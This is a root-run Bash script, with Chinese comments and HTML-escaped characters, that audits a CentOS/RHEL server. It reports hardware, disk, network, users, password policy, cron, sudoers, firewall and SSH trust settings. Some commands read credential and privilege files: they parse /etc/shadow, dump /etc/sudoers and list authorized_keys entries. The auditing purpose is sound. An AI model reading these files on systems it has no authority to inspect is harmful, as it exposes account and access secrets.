/etc/init.d/functions export PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin source /etc/profile #root用户执行脚本 [ $(id -u) -gt 0 ] \u0026amp;\u0026amp; echo \u0026#34;请用root用户执行此脚本！\u0026#34; \u0026amp;\u0026amp; exit 1 function version(){ echo \u0026#34;\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;[${date}] \u0026gt;\u0026gt;\u0026gt; `hostname -s` 主机巡检\u0026#34; } function getSystemStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m****************************************************系统检查****************************************************\\033[0m\u0026#34; if [ -e /etc/sysconfig/i18n ];then default_LANG=\u0026#34;$(grep \u0026#34;LANG=\u0026#34; /etc/sysconfig/i18n | grep -v \u0026#34;^#\u0026#34; | awk -F \u0026#39;\u0026#34;\u0026#39; \u0026#39;{print $2}\u0026#39;)\u0026#34; else default_LANG=$LANG fi export LANG=\u0026#34;en_US.UTF-8\u0026#34; Release=$(cat /etc/redhat-release 2\u0026gt;/dev/null) Kernel=$(uname -r) OS=$(uname -o) Hostname=$(uname -n) SELinux=$(/usr/sbin/sestatus | grep \u0026#34;SELinux status: \u0026#34; | awk \u0026#39;{print $3}\u0026#39;) LastReboot=$(who -b | awk \u0026#39;{print $3,$4}\u0026#39;) uptime=$(uptime | sed \u0026#39;s/.*up \\([^,]*\\), .*/\\1/\u0026#39;) echo \u0026#34; 系统：$OS\u0026#34; echo \u0026#34; 发行版本：$Release\u0026#34; echo \u0026#34; 内核：$Kernel\u0026#34; echo \u0026#34; 主机名：$Hostname\u0026#34; echo \u0026#34; SELinux：$SELinux\u0026#34; echo \u0026#34;语言/编码：$default_LANG\u0026#34; echo \u0026#34; 当前时间：$(date +\u0026#39;%F %T\u0026#39;)\u0026#34; echo \u0026#34; 最后启动：$LastReboot\u0026#34; echo \u0026#34; 运行时间：$uptime\u0026#34; export LANG=\u0026#34;$default_LANG\u0026#34; } function getCpuStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m****************************************************CPU检查*****************************************************\\033[0m\u0026#34; Physical_CPUs=$(grep \u0026#34;physical id\u0026#34; /proc/cpuinfo| sort | uniq | wc -l) Virt_CPUs=$(grep \u0026#34;processor\u0026#34; /proc/cpuinfo | wc -l) CPU_Kernels=$(grep \u0026#34;cores\u0026#34; /proc/cpuinfo|uniq| awk -F \u0026#39;: \u0026#39; \u0026#39;{print $2}\u0026#39;) CPU_Type=$(grep \u0026#34;model name\u0026#34; /proc/cpuinfo | awk -F \u0026#39;: \u0026#39; \u0026#39;{print $2}\u0026#39; | sort | uniq) CPU_Arch=$(uname -m) echo \u0026#34;物理CPU个数:$Physical_CPUs\u0026#34; echo \u0026#34;逻辑CPU个数:$Virt_CPUs\u0026#34; echo \u0026#34;每CPU核心数:$CPU_Kernels\u0026#34; echo \u0026#34; CPU型号:$CPU_Type\u0026#34; echo \u0026#34; CPU架构:$CPU_Arch\u0026#34; } function getMemStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m**************************************************内存检查*****************************************************\\033[0m\u0026#34; if [[ $centosVersion \u0026lt; 7 ]];then free -mo else free -h fi #报表信息 MemTotal=$(grep MemTotal /proc/meminfo| awk \u0026#39;{print $2}\u0026#39;) #KB MemFree=$(grep MemFree /proc/meminfo| awk \u0026#39;{print $2}\u0026#39;) #KB let MemUsed=MemTotal-MemFree MemPercent=$(awk \u0026#34;BEGIN {if($MemTotal==0){printf 100}else{printf \\\u0026#34;%.2f\\\u0026#34;,$MemUsed*100/$MemTotal}}\u0026#34;) } function getDiskStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m**************************************************磁盘检查******************************************************\\033[0m\u0026#34; df -hiP | sed \u0026#39;s/Mounted on/Mounted/\u0026#39;\u0026gt; /tmp/inode df -hTP | sed \u0026#39;s/Mounted on/Mounted/\u0026#39;\u0026gt; /tmp/disk join /tmp/disk /tmp/inode | awk \u0026#39;{print $1,$2,\u0026#34;|\u0026#34;,$3,$4,$5,$6,\u0026#34;|\u0026#34;,$8,$9,$10,$11,\u0026#34;|\u0026#34;,$12}\u0026#39;| column -t #报表信息 diskdata=$(df -TP | sed \u0026#39;1d\u0026#39; | awk \u0026#39;$2!=\u0026#34;tmpfs\u0026#34;{print}\u0026#39;) #KB disktotal=$(echo \u0026#34;$diskdata\u0026#34; | awk \u0026#39;{total+=$3}END{print total}\u0026#39;) #KB diskused=$(echo \u0026#34;$diskdata\u0026#34; | awk \u0026#39;{total+=$4}END{print total}\u0026#39;) #KB diskfree=$((disktotal-diskused)) #KB diskusedpercent=$(echo $disktotal $diskused | awk \u0026#39;{if($1==0){printf 100}else{printf \u0026#34;%.2f\u0026#34;,$2*100/$1}}\u0026#39;) inodedata=$(df -iTP | sed \u0026#39;1d\u0026#39; | awk \u0026#39;$2!=\u0026#34;tmpfs\u0026#34;{print}\u0026#39;) inodetotal=$(echo \u0026#34;$inodedata\u0026#34; | awk \u0026#39;{total+=$3}END{print total}\u0026#39;) inodeused=$(echo \u0026#34;$inodedata\u0026#34; | awk \u0026#39;{total+=$4}END{print total}\u0026#39;) inodefree=$((inodetotal-inodeused)) inodeusedpercent=$(echo $inodetotal $inodeused | awk \u0026#39;{if($1==0){printf 100}else{printf \u0026#34;%.2f\u0026#34;,$2*100/$1}}\u0026#39;) } function get_resource(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m**************************************************资源消耗统计**************************************************\\033[0m\u0026#34; echo -e \u0026#34;\\033[36m*************带宽资源消耗统计*************\\033[0m\u0026#34; #用数组存放网卡名 nic=(`ifconfig | grep ^[a-z] | grep -vE \u0026#39;lo|docker0\u0026#39;| awk -F: \u0026#39;{print $1}\u0026#39;`) time=`date \u0026#34;+%Y-%m-%d %k:%M\u0026#34;` num=0 for ((i=0;i\u0026lt;${#nic[@]};i++)) do #循环五次，避免看到的是偶然的数据 while (( $num\u0026lt;5 )) do rx_before=$(cat /proc/net/dev | grep \u0026#39;${nic[$i]}\u0026#39; | tr : \u0026#34; \u0026#34; | awk \u0026#39;{print $2}\u0026#39;) tx_before=$(cat /proc/net/dev | grep \u0026#39;${nic[$i]}\u0026#39; | tr : \u0026#34; \u0026#34; | awk \u0026#39;{print $10}\u0026#39;) sleep 2 #用sed先获取第7列,再用awk获取第2列，再cut切割,从第7个到最后，即只切割网卡流量数字部分 rx_after=$(cat /proc/net/dev | grep \u0026#39;${nic[$i]}\u0026#39; | tr : \u0026#34; \u0026#34; | awk \u0026#39;{print $2}\u0026#39;) tx_after=$(cat /proc/net/dev | grep \u0026#39;${nic[$i]}\u0026#39; | tr : \u0026#34; \u0026#34; | awk \u0026#39;{print $10}\u0026#39;) #注意下面截取的相差2秒的两个时刻的累计和发送的bytes(即累计传送和接收的位) rx_result=$[(rx_after-rx_before)/1024/1024/2*8] tx_result=$[(tx_after-tx_before)/1024/1024/2*8] echo \u0026#34;$time Now_In_Speed: $rx_result Mbps Now_OUt_Speed: $tx_result Mbps\u0026#34; \u0026gt;\u0026gt; /tmp/network.txt let \u0026#34;num++\u0026#34; done #注意下面grep后面的$time变量要用双引号括起来 rx_result=$(cat /tmp/network.txt|grep \u0026#34;$time\u0026#34;|awk \u0026#39;{In+=$4}END{print In}\u0026#39;) tx_result=$(cat /tmp/network.txt|grep \u0026#34;$time\u0026#34;|awk \u0026#39;{Out+=$7}END{print Out}\u0026#39;) In_Speed=$(echo \u0026#34;scale=2;$rx_result/5\u0026#34;|bc) Out_Speed=$(echo \u0026#34;scale=2;$tx_result/5\u0026#34;|bc) echo -e \u0026#34;\\033[32m In_Speed_average: $In_Speed Mbps Out_Speed_average: $Out_Speed Mbps! \\033[0m\u0026#34; done echo -e \u0026#34;\\033[36m*************CPU资源消耗统计*************\\033[0m\u0026#34; #使用vmstat 1 5命令统计5秒内的使用情况，再计算每秒使用情况 total=`vmstat 1 5|awk \u0026#39;{x+=$13;y+=$14}END{print x+y}\u0026#39;` cpu_average=$(echo \u0026#34;scale=2;$total/5\u0026#34;|bc) #判断CPU使用率（浮点数与整数比较） if [ `echo \u0026#34;${cpu_average} \u0026gt; 70\u0026#34; | bc` -eq 1 ];then echo -e \u0026#34;\\033[31m Total CPU is already use: ${cpu_average}%,请及时处理！\\033[0m\u0026#34; else echo -e \u0026#34;\\033[32m Total CPU is already use: ${cpu_average}%! \\033[0m\u0026#34; fi echo -e \u0026#34;\\033[36m*************磁盘资源消耗统计*************\\033[0m\u0026#34; #磁盘使用情况(注意：需要用sed先进行格式化才能进行累加处理) disk_used=$(df -m | sed \u0026#39;1d;/ /!N;s/\\n//;s/ \\+/ /;\u0026#39; | awk \u0026#39;{used+=$3} END{print used}\u0026#39;) disk_totalSpace=$(df -m | sed \u0026#39;1d;/ /!N;s/\\n//;s/ \\+/ /;\u0026#39; | awk \u0026#39;{totalSpace+=$2} END{print totalSpace}\u0026#39;) disk_all=$(echo \u0026#34;scale=4;$disk_used/$disk_totalSpace\u0026#34; | bc) disk_percent1=$(echo $disk_all | cut -c 2-3) disk_percent2=$(echo $disk_all | cut -c 4-5) disk_warning=`df -m | sed \u0026#39;1d;/ /!N;s/\\n//;s/ \\+/ /;\u0026#39; | awk \u0026#39;{if ($5\u0026gt;85) print $6 \u0026#34;目录使用率：\u0026#34; $5;} \u0026#39;` echo -e \u0026#34;\\033[32m Total disk has used: $disk_percent1.$disk_percent2% \\033[0m\u0026#34; #echo -e \u0026#34;\\t\\t..\u0026#34; 表示换行 if [ -n \u0026#34;$disk_warning\u0026#34; ];then echo -e \u0026#34;\\033[31m${disk_warning} \\n [Error]以上目录使用率超过85%，请及时处理！\\033[0m\u0026#34; fi echo -e \u0026#34;\\033[36m*************内存资源消耗统计*************\\033[0m\u0026#34; #获得系统总内存 memery_all=$(free -m | awk \u0026#39;NR==2\u0026#39; | awk \u0026#39;{print $2}\u0026#39;) #获得占用内存（操作系统 角度） system_memery_used=$(free -m | awk \u0026#39;NR==2\u0026#39; | awk \u0026#39;{print $3}\u0026#39;) #获得buffer、cache占用内存，当内存不够时会及时回收，所以这两部分可用于可用内存的计算 buffer_used=$(free -m | awk \u0026#39;NR==2\u0026#39; | awk \u0026#39;{print $6}\u0026#39;) cache_used=$(free -m | awk \u0026#39;NR==2\u0026#39; | awk \u0026#39;{print $7}\u0026#39;) #获得被使用内存，所以这部分可用于可用内存的计算，注意计算方法 actual_used_all=$[memery_all-(free+buffer_used+cache_used)] #获得实际占用的内存 actual_used_all=`expr $memery_all - $free + $buffer_used + $cache_used ` memery_percent=$(echo \u0026#34;scale=4;$system_memery_used / $memery_all\u0026#34; | bc) memery_percent2=$(echo \u0026#34;scale=4; $actual_used_all / $memery_all\u0026#34; | bc) percent_part1=$(echo $memery_percent | cut -c 2-3) percent_part2=$(echo $memery_percent | cut -c 4-5) percent_part11=$(echo $memery_percent2 | cut -c 2-3) percent_part22=$(echo $memery_percent2 | cut -c 4-5) #获得占用内存（操作系统角度） echo -e \u0026#34;\\033[32m system memery is already use: $percent_part1.$percent_part2% \\033[0m\u0026#34; #获得实际内存占用率 echo -e \u0026#34;\\033[32m actual memery is already use: $percent_part11.$percent_part22% \\033[0m\u0026#34; echo -e \u0026#34;\\033[32m buffer is already used : $buffer_used M \\033[0m\u0026#34; echo -e \u0026#34;\\033[32m cache is already used : $cache_used M \\033[0m\u0026#34; } function getServiceStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m*************************************************服务检查*******************************************************\\033[0m\u0026#34; echo \u0026#34;\u0026#34; if [[ $centosVersion \u0026gt; 7 ]];then conf=$(systemctl list-unit-files --type=service --state=enabled --no-pager | grep \u0026#34;enabled\u0026#34;) process=$(systemctl list-units --type=service --state=running --no-pager | grep \u0026#34;.service\u0026#34;) else conf=$(/sbin/chkconfig | grep -E \u0026#34;:on|:启用\u0026#34;) process=$(/sbin/service --status-all 2\u0026gt;/dev/null | grep -E \u0026#34;is running|正在运行\u0026#34;) fi echo -e \u0026#34;\\033[36m******************服务配置******************\\033[0m\u0026#34; echo \u0026#34;$conf\u0026#34; | column -t echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m**************正在运行的服务****************\\033[0m\u0026#34; echo \u0026#34;$process\u0026#34; } function getAutoStartStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m***********************************************自启动检查*******************************************************\\033[0m\u0026#34; echo -e \u0026#34;\\033[36m****************自启动命令*****************\\033[0m\u0026#34; conf=$(grep -v \u0026#34;^#\u0026#34; /etc/rc.d/rc.local| sed \u0026#39;/^$/d\u0026#39;) echo \u0026#34;$conf\u0026#34; } function getLoginStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m************************************************登录检查********************************************************\\033[0m\u0026#34; last | head } function getNetworkStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m************************************************网络检查********************************************************\\033[0m\u0026#34; if [[ $centosVersion \u0026lt; 7 ]];then /sbin/ifconfig -a | grep -v packets | grep -v collisions | grep -v i net6 else #ip a for i in $(ip link | grep BROADCAST | awk -F: \u0026#39;{print $2}\u0026#39;);do ip add show $i | grep -E \u0026#34;BROADCAST|global\u0026#34;| awk \u0026#39;{print $2}\u0026#39; | tr \u0026#39;\\n\u0026#39; \u0026#39; \u0026#39; ;echo \u0026#34;\u0026#34; ;done fi GATEWAY=$(ip route | grep default | awk \u0026#39;{print $3}\u0026#39;) DNS=$(grep nameserver /etc/resolv.conf| grep -v \u0026#34;#\u0026#34; | awk \u0026#39;{print $2}\u0026#39; | tr \u0026#39;\\n\u0026#39; \u0026#39;,\u0026#39; | sed \u0026#39;s/,$//\u0026#39;) echo \u0026#34;\u0026#34; echo \u0026#34;网关：$GATEWAY \u0026#34; echo \u0026#34;DNS：$DNS\u0026#34; #报表信息 IP=$(ip -f inet addr | grep -v 127.0.0.1 | grep inet | awk \u0026#39;{print $NF,$2}\u0026#39; | tr \u0026#39;\\n\u0026#39; \u0026#39;,\u0026#39; | sed \u0026#39;s/,$//\u0026#39;) MAC=$(ip link | grep -v \u0026#34;LOOPBACK\\|loopback\u0026#34; | awk \u0026#39;{print $2}\u0026#39; | sed \u0026#39;N;s/\\n//\u0026#39; | tr \u0026#39;\\n\u0026#39; \u0026#39;,\u0026#39; | sed \u0026#39;s/,$//\u0026#39;) echo \u0026#34;\u0026#34; ping -c 4 www.baidu.com \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 if [ $? -eq 0 ];then echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[32m网络连接：正常！\\033[0m\u0026#34; else echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[31m网络连接：异常！\\033[0m\u0026#34; fi } function getListenStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m***********************************************监听检查********************************************************\\033[0m\u0026#34; TCPListen=$(ss -ntul | column -t) echo \u0026#34;$TCPListen\u0026#34; } function getCronStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m**********************************************计划任务检查******************************************************\\033[0m\u0026#34; Crontab=0 for shell in $(grep -v \u0026#34;/sbin/nologin\u0026#34; /etc/shells);do for user in $(grep \u0026#34;$shell\u0026#34; /etc/passwd| awk -F: \u0026#39;{print $1}\u0026#39;);do crontab -l -u $user \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 status=$? if [ $status -eq 0 ];then echo -e \u0026#34;\\033[36m************$user用户的定时任务**************\\033[0m\u0026#34; crontab -l -u $user let Crontab=Crontab+$(crontab -l -u $user | wc -l) echo \u0026#34;\u0026#34; fi done done #计划任务 #find /etc/cron* -type f | xargs -i ls -l {} | column -t #let Crontab=Crontab+$(find /etc/cron* -type f | wc -l) } function getHowLongAgo(){ # 计算一个时间戳离现在有多久了 datetime=\u0026#34;$*\u0026#34; [ -z \u0026#34;$datetime\u0026#34; ] \u0026amp;\u0026amp; echo `stat /etc/passwd|awk \u0026#34;NR==6\u0026#34;` Timestamp=$(date +%s -d \u0026#34;$datetime\u0026#34;) Now_Timestamp=$(date +%s) Difference_Timestamp=$(($Now_Timestamp-$Timestamp)) days=0;hours=0;minutes=0; sec_in_day=$((60*60*24)); sec_in_hour=$((60*60)); sec_in_minute=60 while (( $(($Difference_Timestamp-$sec_in_day)) \u0026gt; 1 )) do let Difference_Timestamp=Difference_Timestamp-sec_in_day let days++ done while (( $(($Difference_Timestamp-$sec_in_hour)) \u0026gt; 1 )) do let Difference_Timestamp=Difference_Timestamp-sec_in_hour let hours++ done echo \u0026#34;$days 天 $hours 小时前\u0026#34; } function getUserLastLogin(){ # 获取用户最近一次登录的时间，含年份 # 很遗憾last命令不支持显示年份，只有\u0026#34;last -t YYYYMMDDHHMMSS\u0026#34;表示某个时间之间的登录，我 # 们只能用最笨的方法了，对比今天之前和今年元旦之前（或者去年之前和前年之前……）某个用户 # 登录次数，如果登录统计次数有变化，则说明最近一次登录是今年。 username=$1 : ${username:=\u0026#34;`whoami`\u0026#34;} thisYear=$(date +%Y) oldesYear=$(last | tail -n1 | awk \u0026#39;{print $NF}\u0026#39;) while(( $thisYear \u0026gt;= $oldesYear));do loginBeforeToday=$(last $username | grep $username | wc -l) loginBeforeNewYearsDayOfThisYear=$(last $username -t $thisYear\u0026#34;0101000000\u0026#34; | grep $username | wc -l) if [ $loginBeforeToday -eq 0 ];then echo \u0026#34;从未登录过\u0026#34; break elif [ $loginBeforeToday -gt $loginBeforeNewYearsDayOfThisYear ];then lastDateTime=$(last -i $username | head -n1 | awk \u0026#39;{for(i=4;i\u0026lt;(NF-2);i++)printf\u0026#34;%s \u0026#34;,$i}\u0026#39;)\u0026#34; $thisYear\u0026#34; lastDateTime=$(date \u0026#34;+%Y-%m-%d %H:%M:%S\u0026#34; -d \u0026#34;$lastDateTime\u0026#34;) echo \u0026#34;$lastDateTime\u0026#34; break else thisYear=$((thisYear-1)) fi done } function getUserStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m*************************************************用户检查*******************************************************\\033[0m\u0026#34; #/etc/passwd 最后修改时间 pwdfile=\u0026#34;$(cat /etc/passwd)\u0026#34; Modify=$(stat /etc/passwd | grep Modify | tr \u0026#39;.\u0026#39; \u0026#39; \u0026#39; | awk \u0026#39;{print $2,$3}\u0026#39;) echo \u0026#34;/etc/passwd: $Modify ($(getHowLongAgo $Modify))\u0026#34; echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m******************特权用户******************\\033[0m\u0026#34; RootUser=\u0026#34;\u0026#34; for user in $(echo \u0026#34;$pwdfile\u0026#34; | awk -F: \u0026#39;{print $1}\u0026#39;);do if [ $(id -u $user) -eq 0 ];then echo \u0026#34;$user\u0026#34; RootUser=\u0026#34;$RootUser,$user\u0026#34; fi done echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m******************用户列表******************\\033[0m\u0026#34; USERs=0 echo \u0026#34;$( echo \u0026#34;用户名 UID GID HOME SHELL 最后一次登录\u0026#34; for shell in $(grep -v \u0026#34;/sbin/nologin\u0026#34; /etc/shells);do for username in $(grep \u0026#34;$shell\u0026#34; /etc/passwd| awk -F: \u0026#39;{print $1}\u0026#39;);do userLastLogin=\u0026#34;$(getUserLastLogin $username)\u0026#34; echo \u0026#34;$pwdfile\u0026#34; | grep -w \u0026#34;$username\u0026#34; |grep -w \u0026#34;$shell\u0026#34;| awk -F: -v lastlogin=\u0026#34;$(echo \u0026#34;$userLastLogin\u0026#34; | tr \u0026#39; \u0026#39; \u0026#39;_\u0026#39;)\u0026#34; \u0026#39;{print $1,$3,$4,$6,$7,lastlogin}\u0026#39; done let USERs=USERs+$(echo \u0026#34;$pwdfile\u0026#34; | grep \u0026#34;$shell\u0026#34;| wc -l) done )\u0026#34; | column -t echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m******************空密码用户****************\\033[0m\u0026#34; USEREmptyPassword=\u0026#34;\u0026#34; for shell in $(grep -v \u0026#34;/sbin/nologin\u0026#34; /etc/shells);do for user in $(echo \u0026#34;$pwdfile\u0026#34; | grep \u0026#34;$shell\u0026#34; | cut -d: -f1);do r=$(awk -F: \u0026#39;$2==\u0026#34;!!\u0026#34;{print $1}\u0026#39; /etc/shadow | grep -w $user) if [ ! -z $r ];then echo $r USEREmptyPassword=\u0026#34;$USEREmptyPassword,\u0026#34;$r fi done done echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m*****************相同ID用户*****************\\033[0m\u0026#34; USERTheSameUID=\u0026#34;\u0026#34; UIDs=$(cut -d: -f3 /etc/passwd | sort | uniq -c | awk \u0026#39;$1\u0026gt;1{print $2}\u0026#39;) for uid in $UIDs;do echo -n \u0026#34;$uid\u0026#34;; USERTheSameUID=\u0026#34;$uid\u0026#34; r=$(awk -F: \u0026#39;ORS=\u0026#34;\u0026#34;;$3==\u0026#39;\u0026#34;$uid\u0026#34;\u0026#39;{print \u0026#34;:\u0026#34;,$1}\u0026#39; /etc/passwd) echo \u0026#34;$r\u0026#34; echo \u0026#34;\u0026#34; USERTheSameUID=\u0026#34;$USERTheSameUID $r,\u0026#34; done } function getPasswordStatus { echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m*************************************************密码检查*******************************************************\\033[0m\u0026#34; pwdfile=\u0026#34;$(cat /etc/passwd)\u0026#34; echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m****************密码过期检查****************\\033[0m\u0026#34; result=\u0026#34;\u0026#34; for shell in $(grep -v \u0026#34;/sbin/nologin\u0026#34; /etc/shells);do for user in $(echo \u0026#34;$pwdfile\u0026#34; | grep \u0026#34;$shell\u0026#34; | cut -d: -f1);do get_expiry_date=$(/usr/bin/chage -l $user | grep \u0026#39;Password expires\u0026#39; | cut -d: -f2) if [[ $get_expiry_date = \u0026#39; never\u0026#39; || $get_expiry_date = \u0026#39;never\u0026#39; ]];then printf \u0026#34;%-15s 永不过期\\n\u0026#34; $user result=\u0026#34;$result,$user:never\u0026#34; else password_expiry_date=$(date -d \u0026#34;$get_expiry_date\u0026#34; \u0026#34;+%s\u0026#34;) current_date=$(date \u0026#34;+%s\u0026#34;) diff=$(($password_expiry_date-$current_date)) let DAYS=$(($diff/(60*60*24))) printf \u0026#34;%-15s %s天后过期\\n\u0026#34; $user $DAYS result=\u0026#34;$result,$user:$DAYS days\u0026#34; fi done done report_PasswordExpiry=$(echo $result | sed \u0026#39;s/^,//\u0026#39;) echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m****************密码策略检查****************\\033[0m\u0026#34; grep -v \u0026#34;#\u0026#34; /etc/login.defs | grep -E \u0026#34;PASS_MAX_DAYS|PASS_MIN_DAYS|PASS_MIN_LEN|PASS_WARN_AGE\u0026#34; } function getSudoersStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m**********************************************Sudoers检查*******************************************************\\033[0m\u0026#34; conf=$(grep -v \u0026#34;^#\u0026#34; /etc/sudoers| grep -v \u0026#34;^Defaults\u0026#34; | sed \u0026#39;/^$/d\u0026#39;) echo \u0026#34;$conf\u0026#34; echo \u0026#34;\u0026#34; } function getInstalledStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m*************************************************软件检查*******************************************************\\033[0m\u0026#34; rpm -qa --last | head | column -t } function getProcessStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m*************************************************进程检查*******************************************************\\033[0m\u0026#34; if [ $(ps -ef | grep defunct | grep -v grep | wc -l) -ge 1 ];then echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m***************僵尸进程***************\\033[0m\u0026#34; ps -ef | head -n1 ps -ef | grep defunct | grep -v grep fi echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m************CPU占用TOP 10进程*************\\033[0m\u0026#34; echo -e \u0026#34;用户 进程ID %CPU 命令 $(ps aux | awk \u0026#39;{print $1, $2, $3, $11}\u0026#39; | sort -k3rn | head -n 10 )\u0026#34;| column -t echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m************内存占用TOP 10进程*************\\033[0m\u0026#34; echo -e \u0026#34;用户 进程ID %MEM 虚拟内存 常驻内存 命令 $(ps aux | awk \u0026#39;{print $1, $2, $4, $5, $6, $11}\u0026#39; | sort -k3rn | head -n 10 )\u0026#34;| column -t #echo \u0026#34;\u0026#34; #echo -e \u0026#34;\\033[36m************SWAP占用TOP 10进程*************\\033[0m\u0026#34; #awk: fatal: cannot open file `/proc/18713/smaps\u0026#39; for reading (No such file or directory) #for i in `cd /proc;ls |grep \u0026#34;^[0-9]\u0026#34;|awk \u0026#39; $0 \u0026gt;100\u0026#39;`;do awk \u0026#39;{if (-f /proc/$i/smaps) print \u0026#34;$i file is not exist\u0026#34;; else print \u0026#34;$i\u0026#34;}\u0026#39;;done # for i in `cd /proc;ls |grep \u0026#34;^[0-9]\u0026#34;|awk \u0026#39; $0 \u0026gt;100\u0026#39;` ;do awk \u0026#39;/Swap:/{a=a+$2}END{print \u0026#39;\u0026#34;$i\u0026#34;\u0026#39;,a/1024\u0026#34;M\u0026#34;}\u0026#39; /proc/$i/smaps ;done |sort -k2nr \u0026gt; /tmp/swap.txt #echo -e \u0026#34;进程ID SWAP使用 $(cat /tmp/swap.txt|grep -v awk | head -n 10)\u0026#34;| column -t } function getSyslogStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m***********************************************syslog检查*******************************************************\\033[0m\u0026#34; echo \u0026#34;SYSLOG服务状态：$(getState rsyslog)\u0026#34; echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m***************rsyslog配置******************\\033[0m\u0026#34; cat /etc/rsyslog.conf 2\u0026gt;/dev/null | grep -v \u0026#34;^#\u0026#34; | grep -v \u0026#34;^\\\\$\u0026#34; | sed \u0026#39;/^$/d\u0026#39; | column -t } function getFirewallStatus(){ echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m***********************************************防火墙检查*******************************************************\\033[0m\u0026#34; echo -e \u0026#34;\\033[36m****************防火墙状态******************\\033[0m\u0026#34; if [[ $centosVersion = 7 ]];then systemctl status firewalld \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 status=$? if [ $status -eq 0 ];then s=\u0026#34;active\u0026#34; elif [ $status -eq 3 ];then s=\u0026#34;inactive\u0026#34; elif [ $status -eq 4 ];then s=\u0026#34;permission denied\u0026#34; else s=\u0026#34;unknown\u0026#34; fi else s=\u0026#34;$(getState iptables)\u0026#34; fi echo \u0026#34;firewalld: $s\u0026#34; echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m****************防火墙配置******************\\033[0m\u0026#34; cat /etc/sysconfig/firewalld 2\u0026gt;/dev/null } function getSNMPStatus(){ #SNMP服务状态，配置等 echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m***********************************************SNMP检查*********************************************************\\033[0m\u0026#34; status=\u0026#34;$(getState snmpd)\u0026#34; echo \u0026#34;SNMP服务状态：$status\u0026#34; echo \u0026#34;\u0026#34; if [ -e /etc/snmp/snmpd.conf ];then echo \u0026#34;/etc/snmp/snmpd.conf\u0026#34; echo \u0026#34;--------------------\u0026#34; cat /etc/snmp/snmpd.conf 2\u0026gt;/dev/null | grep -v \u0026#34;^#\u0026#34; | sed \u0026#39;/^$/d\u0026#39; fi } function getState(){ if [[ $centosVersion \u0026lt; 7 ]];then if [ -e \u0026#34;/etc/init.d/$1\u0026#34; ];then if [ `/etc/init.d/$1 status 2\u0026gt;/dev/null | grep -E \u0026#34;is running|正在运行\u0026#34; | wc -l` -ge 1 ];then r=\u0026#34;active\u0026#34; else r=\u0026#34;inactive\u0026#34; fi else r=\u0026#34;unknown\u0026#34; fi else #CentOS 7+ r=\u0026#34;$(systemctl is-active $1 2\u0026gt;\u0026amp;1)\u0026#34; fi echo \u0026#34;$r\u0026#34; } function getSSHStatus(){ #SSHD服务状态，配置,受信任主机等 echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[33m************************************************SSH检查*********************************************************\\033[0m\u0026#34; #检查受信任主机 pwdfile=\u0026#34;$(cat /etc/passwd)\u0026#34; echo \u0026#34;SSH服务状态：$(getState sshd)\u0026#34; Protocol_Version=$(cat /etc/ssh/sshd_config | grep Protocol | awk \u0026#39;{print $2}\u0026#39;) echo \u0026#34;SSH协议版本：$Protocol_Version\u0026#34; echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m****************信任主机******************\\033[0m\u0026#34; authorized=0 for user in $(echo \u0026#34;$pwdfile\u0026#34; | grep /bin/bash | awk -F: \u0026#39;{print $1}\u0026#39;);do authorize_file=$(echo \u0026#34;$pwdfile\u0026#34; | grep -w $user | awk -F: \u0026#39;{printf $6\u0026#34;/.ssh/authorized_keys\u0026#34;}\u0026#39;) authorized_host=$(cat $authorize_file 2\u0026gt;/dev/null | awk \u0026#39;{print $3}\u0026#39; | tr \u0026#39;\\n\u0026#39; \u0026#39;,\u0026#39; | sed \u0026#39;s/,$//\u0026#39;) if [ ! -z $authorized_host ];then echo \u0026#34;$user 授权 \\\u0026#34;$authorized_host\\\u0026#34; 无密码访问\u0026#34; fi let authorized=authorized+$(cat $authorize_file 2\u0026gt;/dev/null | awk \u0026#39;{print $3}\u0026#39;|wc -l) done echo \u0026#34;\u0026#34; echo -e \u0026#34;\\033[36m*******是否允许ROOT远程登录***************\\033[0m\u0026#34; config=$(cat /etc/ssh/sshd_config | grep PermitRootLogin) firstChar=${config:0:1} if [ $firstChar == \u0026#34;#\u0026#34; ];then PermitRootLogin=\u0026#34;yes\u0026#34; else PermitRootLogin=$(echo $config | awk \u0026#39;{print $2}\u0026#39;) fi echo \u0026#34;PermitRootLogin $PermitRootLogin\u0026#34; 